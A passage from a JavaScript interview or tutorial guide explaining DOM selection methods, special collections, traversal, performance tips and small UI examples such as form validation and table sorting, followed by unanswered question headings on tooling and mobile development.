**9. matches() - Check if Element Matches Selector:**

```javascript
const element = document.querySelector('.item');

// Check if element matches selector
if (element.matches('.active')) {
  console.log('Element is active');
}

if (element.matches('div.item[data-type="primary"]')) {
  console.log('Matches complex selector');
}

// Common use case: Event delegation
document.addEventListener('click', (e) => {
  if (e.target.matches('.button, .link')) {
    handleClick(e);
  }
});

// Check multiple conditions
if (element.matches('.item') && !element.matches('.disabled')) {
  // Element is an enabled item
}
```

**Special Collections:**

**10. forms - All Forms:**

```javascript
// Access all forms
const forms = document.forms;

// Access by index
const firstForm = document.forms[0];

// Access by name attribute
const loginForm = document.forms['login'];
const contactForm = document.forms.contact; // Dot notation

// Iterate
Array.from(document.forms).forEach(form => {
  console.log(form.name);
});
```

**11. images - All Images:**

```javascript
// All img elements
const images = document.images;

// Iterate and lazy load
Array.from(document.images).forEach(img => {
  if (img.dataset.src) {
    img.src = img.dataset.src;
  }
});
```

**12. links - All Links:**

```javascript
// All <a> elements with href attribute
const links = document.links;

// Add external link indicator
Array.from(document.links).forEach(link => {
  if (link.hostname !== window.location.hostname) {
    link.target = '_blank';
    link.rel = 'noopener noreferrer';
  }
});
```

**13. Form Elements:**

```javascript
const form = document.querySelector('form');

// Access form elements
const elements = form.elements;

// By name
const username = form.elements['username'];
const email = form.elements.email;

// By index
const firstInput = form.elements[0];

// Radio button groups
const gender = form.elements['gender']; // RadioNodeList

// Get form data
function getFormData(form) {
  const data = {};
  const elements = form.elements;
  
  for (let element of elements) {
    if (element.name && !element.disabled) {
      if (element.type === 'checkbox') {
        data[element.name] = element.checked;
      } else if (element.type === 'radio') {
        if (element.checked) {
          data[element.name] = element.value;
        }
      } else {
        data[element.name] = element.value;
      }
    }
  }
  
  return data;
}
```

**Advanced Selection Techniques:**

**14. Combining Methods:**

```javascript
// Find all active items in a specific container
const container = document.getElementById('main-container');
const activeItems = container.querySelectorAll('.item.active');

// Find parent, then children
const parent = document.querySelector('.parent');
const children = parent.children;
const firstChild = parent.firstElementChild;

// Complex traversal
const button = document.querySelector('.submit-btn');
const form = button.closest('form');
const inputs = form.querySelectorAll('input[required]');

// Find siblings
const current = document.querySelector('.current');
const next = current.nextElementSibling;
const prev = current.previousElementSibling;
```

**15. Custom Selectors and Utilities:**

```javascript
// Helper function to select with default
function $(selector, context = document) {
  return context.querySelector(selector);
}

function $$(selector, context = document) {
  return Array.from(context.querySelectorAll(selector));
}

// Usage
const element = $('.my-class');
const elements = $$('.item');

// Find by attribute value
function findByAttribute(attr, value) {
  return document.querySelector(`[${attr}="${value}"]`);
}

const element = findByAttribute('data-id', '123');

// Find by text content
function findByText(text, tag = '*') {
  return Array.from(document.querySelectorAll(tag))
    .find(el => el.textContent.trim() === text);
}

const header = findByText('Welcome', 'h1');

// Find by partial text
function findByPartialText(text, tag = '*') {
  return Array.from(document.querySelectorAll(tag))
    .filter(el => el.textContent.includes(text));
}

// Find by data attribute
function findByData(key, value) {
  return document.querySelectorAll(`[data-${key}="${value}"]`);
}

const items = findByData('category', 'electronics');
```

**16. Performance Optimizations:**

```javascript
// Cache selectors (don't query repeatedly)
// ❌ Bad
for (let i = 0; i < 100; i++) {
  document.querySelector('.container').appendChild(element);
}

// ✅ Good
const container = document.querySelector('.container');
for (let i = 0; i < 100; i++) {
  container.appendChild(element);
}

// Use ID for single elements (fastest)
const byId = document.getElementById('unique-id'); // Fast
const byQuery = document.querySelector('#unique-id'); // Slower

// Scope queries to narrow context
// ❌ Bad - searches entire document
const items = document.querySelectorAll('.item');

// ✅ Good - searches within container only
const container = document.getElementById('container');
const items = container.querySelectorAll('.item');

// Use specific selectors
// ❌ Slow - overly broad
const all = document.querySelectorAll('*');

// ✅ Fast - specific
const divs = document.getElementsByTagName('div');
const items = document.getElementsByClassName('item');
```

**17. Handling Dynamic Content:**

```javascript
// Elements added after page load
function waitForElement(selector, timeout = 5000) {
  return new Promise((resolve, reject) => {
    const element = document.querySelector(selector);
    
    if (element) {
      return resolve(element);
    }
    
    const observer = new MutationObserver((mutations) => {
      const element = document.querySelector(selector);
      if (element) {
        observer.disconnect();
        resolve(element);
      }
    });
    
    observer.observe(document.body, {
      childList: true,
      subtree: true
    });
    
    setTimeout(() => {
      observer.disconnect();
      reject(new Error(`Element ${selector} not found within ${timeout}ms`));
    }, timeout);
  });
}

// Usage
waitForElement('.dynamic-content')
  .then(element => {
    console.log('Found element:', element);
  })
  .catch(error => {
    console.error(error);
  });
```

**18. Finding Elements by Position:**

```javascript
// Element at specific coordinates
const element = document.elementFromPoint(x, y);

// All elements at coordinates (stacked)
const elements = document.elementsFromPoint(x, y);

// Use case: Detecting what's under cursor
document.addEventListener('mousemove', (e) => {
  const element = document.elementFromPoint(e.clientX, e.clientY);
  console.log('Hovering over:', element.tagName);
});

// Find elements in viewport
function getElementsInViewport() {
  const elements = document.querySelectorAll('*');
  return Array.from(elements).filter(el => {
    const rect = el.getBoundingClientRect();
    return (
      rect.top >= 0 &&
      rect.left >= 0 &&
      rect.bottom <= window.innerHeight &&
      rect.right <= window.innerWidth
    );
  });
}
```

**Real-World Examples:**

**1. Form Validation:**

```javascript
function validateForm(formId) {
  const form = document.getElementById(formId);
  const requiredFields = form.querySelectorAll('[required]');
  const errors = [];
  
  requiredFields.forEach(field => {
    if (!field.value.trim()) {
      errors.push(`${field.name} is required`);
      field.classList.add('error');
    } else {
      field.classList.remove('error');
    }
  });
  
  // Validate email
  const emailInput = form.querySelector('input[type="email"]');
  if (emailInput && emailInput.value) {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(emailInput.value)) {
      errors.push('Invalid email format');
      emailInput.classList.add('error');
    }
  }
  
  return errors;
}
```

**2. Navigation Menu Highlighting:**

```javascript
function highlightCurrentPage() {
  const currentUrl = window.location.pathname;
  const menuLinks = document.querySelectorAll('.nav-menu a');
  
  menuLinks.forEach(link => {
    link.classList.remove('active');
    
    if (link.getAttribute('href') === currentUrl) {
      link.classList.add('active');
      
      // Also highlight parent menu items
      const parentMenu = link.closest('.nav-submenu');
      if (parentMenu) {
        const parentLink = parentMenu.previousElementSibling;
        if (parentLink) {
          parentLink.classList.add('active');
        }
      }
    }
  });
}
```

**3. Table Sorting:**

```javascript
function sortTable(tableId, columnIndex) {
  const table = document.getElementById(tableId);
  const tbody = table.querySelector('tbody');
  const rows = Array.from(tbody.querySelectorAll('tr'));
  
  rows.sort((a, b) => {
    const aValue = a.children[columnIndex].textContent;
    const bValue = b.children[columnIndex].textContent;
    return aValue.localeCompare(bValue);
  });
  
  // Clear and re-append sorted rows
  tbody.innerHTML = '';
  rows.forEach(row => tbody.appendChild(row));
}

// Add click handlers to headers
document.querySelectorAll('th').forEach((header, index) => {
  header.addEventListener('click', () => {
    const table = header.closest('table');
    sortTable(table.id, index);
  });
});
```

**4. Accordion Component:**

```javascript
function initializeAccordion() {
  const accordionHeaders = document.querySelectorAll('.accordion-header');
  
  accordionHeaders.forEach(header => {
    header.addEventListener('click', () => {
      // Find the content panel
      const content = header.nextElementSibling;
      
      // Close other panels
      const accordion = header.closest('.accordion');
      const allPanels = accordion.querySelectorAll('.accordion-content');
      const allHeaders = accordion.querySelectorAll('.accordion-header');
      
      allPanels.forEach(panel => {
        if (panel !== content) {
          panel.classList.remove('active');
        }
      });
      
      allHeaders.forEach(h => {
        if (h !== header) {
          h.classList.remove('active');
        }
      });
      
      // Toggle current panel
      header.classList.toggle('active');
      content.classList.toggle('active');
    });
  });
}
```

**Method Comparison Summary:**

```javascript
// Speed comparison (fastest to slowest):
// 1. getElementById() - O(1) hash lookup
// 2. getElementsByClassName() - Optimized by browsers
// 3. getElementsByTagName() - Optimized by browsers
// 4. querySelector() - CSS engine, slower but flexible
// 5. querySelectorAll() - CSS engine, returns all matches

// Live vs Static:
// Live (auto-updates): getElementsByClassName, getElementsByTagName, children
// Static (snapshot): querySelectorAll, childNodes (in some cases)

// When to use what:
// - getElementById(): Single element by ID (fastest)
// - querySelector(): Single element, need CSS selector flexibility
// - querySelectorAll(): Multiple elements, need CSS selector flexibility
// - getElementsByClassName(): Multiple elements by class, need live collection
// - getElementsByTagName(): Multiple elements by tag, need live collection
// - closest(): Find ancestor matching selector
// - matches(): Check if element matches selector
```

**Best Practices:**

1. **Cache DOM queries** - Don't query repeatedly in loops
2. **Use specific selectors** - More specific = faster
3. **Scope queries** - Query within a container, not whole document
4. **Use IDs when possible** - Fastest lookup method
5. **Be aware of live vs static** - Know when collections update
6. **Validate existence** - Check if element exists before using
7. **Use modern methods** - querySelector/querySelectorAll for flexibility
8. **Consider performance** - getElementById is faster than querySelector for IDs




## 87. Explain the difference between `innerHTML` and `textContent`.



## 88. How do you handle DOM events in a memory-efficient way?



# Tooling and Build Systems (89-93)

## 89. What is npm, and how do you use it?



## 90. Discuss the role of Webpack in modern JavaScript development.



## 91. What is a source map?



## 92. How do you use ESLint for maintaining JavaScript code quality?



## 93. What is continuous integration/continuous deployment (CI/CD) in the context of JS development?



# JavaScript and the Web Platform (94-97)

## 94. What is the Window object and its significance?



## 95. Explain the Document object.



## 96. What new features does HTML5 bring to JavaScript development?



## 97. Discuss the role of JavaScript in Progressive Web Apps (PWAs).



# JavaScript and Mobile Development (98-100)

## 98. Explain how to use JavaScript for mobile development.



## 99. What is React Native and how does it differ from traditional web apps?



## 100. How does JavaScript interact with native mobile components?


```

